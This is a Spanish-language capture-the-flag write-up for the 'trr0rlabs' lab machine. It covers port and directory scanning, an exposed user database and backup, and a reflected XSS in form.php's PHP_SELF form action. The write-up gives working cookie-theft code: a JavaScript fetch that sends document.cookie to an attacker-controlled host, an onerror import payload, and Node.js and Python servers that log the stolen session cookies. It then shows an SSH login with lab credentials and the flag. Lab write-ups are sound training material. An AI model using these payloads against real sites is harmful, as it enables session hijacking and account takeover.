---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Trr0rlabs BugBountyLabs (Avanzado)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bugbountylabs_trr0rlabs.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
python3 bugbountylabs_trr0rlabs.py
```

Info:

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    ██╗      █████╗ ██████╗ ███████╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    ██║     ██╔══██╗██╔══██╗██╔════╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     ██║     ███████║██████╔╝███████╗
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      ██║     ██╔══██║██╔══██╗╚════██║
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       ███████╗██║  ██║██████╔╝███████║
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝

Fundadores
El Pingüino de Mario
Curiosidades De Hackers

Cofundadores
Zunderrub
CondorHacks
Lenam

Descargando la máquina trr0rlabs, espere por favor...

[########################################] 100%
Descarga completa.
La IP de la máquina trr0rlabs es -> 172.17.0.2

Presiona Ctrl+C para detener la máquina
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-18 09:21 CET
Nmap scan report for openredirect.dl (172.17.0.2)
Host is up (0.000033s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 74:91:a6:35:97:31:ba:8b:f6:ad:a8:c8:87:76:3d:78 (ECDSA)
|_  256 c6:01:86:62:e3:09:19:ca:d5:66:3f:fa:2d:9a:d8:91 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://trr0rlabs.bbl/
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.80 seconds
```

Vemos que tiene un puerto `80`, que si entramos nos lleva hacia un dominio llamado `trr0rlabs.bbl` por lo que tendremos que añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>              trr0rlabs.bbl
```

Lo guardamos y ahora volvemos a entrar o recargar la pagina.

Veremos una pagina web y una cosa bastante interesante es que tenemos el `rol` del `user` por lo que tendremos que intentar conseguir el de `admin` supongo, pero como este laboratorio se centra en el `XSS` vamos a intentar realizar este tipo de inyecciones a ver que encontramos.

Si nos vamos a la seccion de `Submit writeup` veremos un formulario para poder subir nuestro `writeup` de alguna maquina, pero si en vez de poner el link de dicho `writeup` ponemos un link hacia nuestro servidor de `python3` con nuestra `IP` para ver si recibimos un intento de que se descargara algo, veremos lo siguiente:

> Servidor de Python3

```shell
python3 -m http.server 80
```

> Formulario de pagina

```
Nombre: test
Link: http://<IP_ATTACKER>/
```

Y si esperamos un ratito veremos lo siguiente en el servidor de `python3`.

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [18/Mar/2025 09:27:02] "GET / HTTP/1.1" 200 -
```

Veremos que funciono, por lo que vamos a intentar obtener alguna `Cookie` a ver si tenemos suerte.

> cookie.js

```js
from http.server import BaseHTTPRequestHandler, HTTPServer

class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        print("🔥 Cookie robada:", self.path)
        with open("cookies.txt", "a") as file:
            file.write(self.path + "\n")
        self.send_response(200)
        self.end_headers()

server = HTTPServer(("0.0.0.0", 8000), RequestHandler)
print("🚀 Esperando cookies...")
server.serve_forever()
```

Con esto lo que vamos hacer es que nos llegara la `cookie` en nuestro servidor de `python3` en el puerto `8000`, ahora si probamos a meter el `link` con dicho archivo veremos que lo obtiene pero no obtenemos nada, por lo que seguiremos buscando.

Ahora vamos a realizar un poco de `fuzzing` para ver que encontramos:

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 278]
/.htaccess.html       (Status: 403) [Size: 278]
/.htaccess.php        (Status: 403) [Size: 278]
/.htpasswd.php        (Status: 403) [Size: 278]
/.htpasswd.txt        (Status: 403) [Size: 278]
/.htaccess.txt        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htpasswd.html       (Status: 403) [Size: 278]
/admin.php            (Status: 200) [Size: 2226]
/backup               (Status: 200) [Size: 952]
/css                  (Status: 200) [Size: 932]
/db                   (Status: 200) [Size: 931]
/form.php             (Status: 200) [Size: 2603]
/img                  (Status: 200) [Size: 938]
/index.php            (Status: 200) [Size: 2721]
/javascript           (Status: 403) [Size: 278]
/js                   (Status: 200) [Size: 1128]
/logout.php           (Status: 200) [Size: 2226]
/machines.php         (Status: 200) [Size: 1581]
/server-status        (Status: 403) [Size: 278]
Progress: 81876 / 81880 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos varias cosas interesantes, entre ellas el directorio `backup` y `db`, si entramos en ellos veremos lo siguiente:

> backup

```
backup.tar.gz
```

> db

```
users.db
```

Vamos primero a ver el archivo `users.db`.

### Sqlite3

```shell
sqlite3 users.db
```

Dentro de este entorno, listaremos las tablas:

```sql
.tables
```

Info:

```
users
```

Ahora veremos todo lo que contiene la tabla `users`.

```sql
SELECT * FROM users;
```

Info:

```
1|admin|$2y$10$4pwMP0yqf5zVtIbkkoVypuakeY3Mq3ielHgJjw.rKYgu5nWs7Iv62
```

Veremos que hay un usuario llamado `admin` junto con su contraseña `hasheada`.

Pero veremos que no se puede `crackear` si nos descomprimimos el archivo `.tar.gz` veremos lo siguiente:

```shell
tar -xzf backup.tar.gz
```

Y veremos que hay una carpeta llamada `trr0rlabs.bbl` que contendra la pagina entera de `trr0rlabs` por lo que vamos a investigarlo.

Si vamos al siguiente archivo llamado `form.php` veremos lo siguiente:

```php
<?php
session_start();

if (!isset($_SESSION["role"])) {
    $_SESSION["role"] = "user";
}

$username = $link = "";
$username_err = $link_err = "";
$msg_suc = "";

if (isset($_GET["send_link"])) {
    if (!empty($_GET["username"])){
        $username = $_GET["username"];
    } else {
        $username_err = "<p class='error'>Debes de introducir el <span class='strong'>nombre de usuari>
    }

    if (!empty($_GET["link"])) {
        $link = $_GET["link"];
    } else {
        $link_err = "<p class='error'>Debes de introducir el <span class='strong'>link del writeup</sp>
    }

    if (!empty($username) && !empty($link)) {
        $file = fopen("trr0rlabs_writeups.txt", "wb");
        fwrite($file, "$username;$link\n");
        fclose($file);
        $msg_suc = "<p class='success'>Writeup enviando correctamente en unos instantes lo revisará el>
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Evitar que desaparezcan los estilos cuando se acontece el XSS (Cross Site Scripting) -->
    <base href="http://trr0rlabs.bbl">
    <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/style.css">
    <title>trr0rlabs</title>
</head>

<body>
    <!-- Barra de navegación -->
    <header>
        <h1 id="titulo" class="red"><a href="index.php">trr0rlabs</a></h1>
        <h2 id="role">Rol actual: <span class="red"><?php echo $_SESSION["role"]; ?></span></h2>
        <nav>
            <ul>
                <li><a href="index.php">Home</a></li>
                <li><a href="machines.php">Machines</a></li>
                <li><a href="form.php">Submit writeup</a></li>
                <li><a href="admin.php">Admin</a></li>
                <?php echo $_SESSION['role'] == "admin" ? '<li><a href="logout.php">Logout</a></li>' :>
            </ul>
        </nav>
    </header>

    <!-- Main -->
    <main id="main_div">
        <section>
            <article>
                <h1>¡ Sube tu Writeup !</h1>
                <p>Anímate y sube tu writeup a <span class="red">trr0rlabs</span>, tan solo tienes que>
                    <span class="strong">administrador</span> para evitar cualquier problema.
                </p>
            </article>
            <article id="form_div">
	            <h1>Rellena tus datos</h1>
                    <form method="GET" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
                        <label for="username">Nombre: </label>
                        <br>
                        <input id="username" type="text" name="username" placeholder="Introduce tu nom>
                        <br>
                        <label for="link">Writeup Link: </label>
                        <br>
                        <input id="last_field" type="text" name="link" placeholder="Introduce el link >
                        <div id="div_msg">
                            <?php echo $username_err; ?>
                            <?php echo $link_err; ?>
                            <?php echo $msg_suc; ?>
                        </div>
                        <input type="submit" value="Enviar" name="send_link">
                    </form>
            </article>
        </section>
    </main>

    <!-- Fotter -->
    <footer>
        <p>Web designed by <span class="red"><a href="https://trr0r.github.io/" target="_blank">trr0r<>
    </footer>
</body>

</html>
```

Vemos que en la siguiente linea es vulnerable a un `XSS` ya que no esta sanitizando la entrada:

```php
<form method="GET" action="<?php echo $_SERVER["PHP_SELF"]; ?>">
```

Si probamos a poner esto en la `URL` de esta forma:

```
URL = http://trr0rlabs.bbl/form.php/"><script>alert('XSS')</script>
```

Veremos lo siguiente en la pagina.

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Vemos que esta funcionando y se nos esta ejecutando un `XSS` ahora nuestro objetivo es obtener la `Cookie` del usuario `admin` o por lo menos intentarlo.

> cookie.js (Modificado)

```js
// Obtener las cookies
const cookies = document.cookie;

// Enviar las cookies a tu servidor
fetch('http://<IP_ATTACKER>:8000/receive_cookie?cookie=' + encodeURIComponent(cookies))
    .then(response => response.text())
    .then(data => console.log("Cookies enviadas:", data))
    .catch(error => console.error("Error al enviar cookies:", error));
```

> PARA QUE EL SERVIDOR OBTENGA EL ARCHIVO

```shell
python3 -m http.server 80
```

> PARA RECIBIR COOKIE

```shell
python3 -m http.server 8000
```

Si nosotros metemos este `payload` para importar un archivo de forma externa de nuestra `IP` atacante del archivo creado anteriormente:

```
URL = trr0rlabs.bbl/form.php/"><img src/onerror=import("http:<IP_ATTACKER>/cookie.js")>
```

Si vamos a la consola veremos que nos lo esta bloqueando por el `Origin` ya que la cabecera de origen nos lo esta bloqueando:

Por lo que vamos a crear un servidor de `Node.js` para realizar un `bypass` de esta cabecera y que asi nos funcione para robar la `Cookie`

Antes vamos a instalar algunas dependencias que vamos a necesitar.

```shell
npm install express cors
```

Ahora vamos a utilizar el mismo archivo `cookie.js` y vamos a establecerlo en la raiz del servidor `Node.js`.

```shell
npm init -y
```

Info:

```js
Wrote to /home/d1se0/Desktop/package.json:

{
  "name": "desktop",
  "version": "1.0.0",
  "description": "",
  "main": "cookie.js",
  "scripts": {
    "test": "echo \"Error: no test specified\" && exit 1"
  },
  "keywords": [],
  "author": "",
  "license": "ISC"
}
```

Ahora vamos a crear el archivo llamado `server.js` para que desde la pagina acceda a dicho servidor y directamente inyecte en la cabecera el `Origin` de nuestro servidor y pueda cargar el archivo sin ningun problema.

> server.js

```js
const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs'); // Asegúrate de importar 'fs'

const app = express();

// Habilitar CORS para todas las solicitudes
app.use(cors());

// Servir el archivo cookie.js
app.get('/cookie.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'cookie.js'));
});

// Endpoint para recibir las cookies
app.get('/receive_cookie', (req, res) => {
    const cookie = req.query.cookie;
    if (cookie) {
        console.log("Cookie recibida: " + cookie);
        fs.appendFile('cookies.txt', cookie + '\n', err => {
            if (err) throw err;
            console.log('Cookie guardada');
        });
        res.send('Cookie recibida');
    } else {
        res.send('No cookie');
    }
});

// Iniciar el servidor en el puerto 8000
app.listen(8000, () => {
    console.log('Servidor Node.js corriendo en http://localhost:8000');
});
```

Ahora vamos a iniciar el servidor con `node` de la siguiente forma:

```shell
node server.js
```

Si nos vamos a la `URL` tendremos que poner lo mismo de antes, como en el principio de la siguiente forma:

```
URL = trr0rlabs.bbl/form.php/"><img src/onerror=import("http:<IP_ATTACKER>:8000/cookie.js")>
```

En la consola de la pagina veremos que ha funcionado:

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Y si volvemos a donde tenemos lanzado el servidor de `Node.js` veremos lo siguiente:

```
Servidor Node.js corriendo en http://localhost:8000
Cookie recibida: PHPSESSID=8b38v6l7en8o6uasc4c281gi6p
Cookie guardada
```

Vemos que lo capturo de forma correcta, pero sera la de nuestro `usuario` para obtener la del `admin` vamos a enviar en el campo de `link` de enviar el `writeup` el siguiente link:

```
http://trr0rlabs.bbl/form.php/"><img src/onerror=import("http:<IP_ATTACKER>:8000/cookie.js")>
```

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Ahora si esperamos un poco veremos que nos llega la `Cookie` del usuario `admin`.

```
Servidor Node.js corriendo en http://localhost:8000
Cookie recibida: PHPSESSID=ch5tusd7c1p83i5f1s38nps6k6
Cookie guardada
```

Vemos que ha funcionado y ahora solo tendremos que `inspeccionar` la pagina, irnos a `Storage` y en la parte de `Cookie` reemplazaremos la que tenemos actualmente por la del `admin`:

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Con esto veremos que somos el `rol` `admin` y si nos vamos a la pestaña de `admin` veremos que lo hemos conseguido:

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Vemos que las credenciales para el `SSH` aparecen ahi, pero no funciona la contraseña, si metemos por delante la palabra `trr0rson` veremos que funciona por lo que las credenciales serian las siguientes:

```
User: admin
Pass: trr0radmiñç
```

### SSH

```shell
ssh admin@<IP>
```

Metemos como contraseña `trr0radmiñç` y veremos que estamos dentro, seguidamente se nos mostrara la `flag`.

```
admin@172.17.0.2's password:
Permission denied, please try again.
admin@172.17.0.2's password:
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.11.2-amd64 x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Sun Feb  2 11:05:06 2025 from 172.17.0.1
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

4e2126c3a869842968d00c163e0a2749

admin@74cc92267962:~$ whoami
admin
```

> flag

```
4e2126c3a869842968d00c163e0a2749
```

Por lo que habremos terminado la maquina pudiendo haber explotado la vulnerabilidad `XSS` de un robo de `Cookie`.
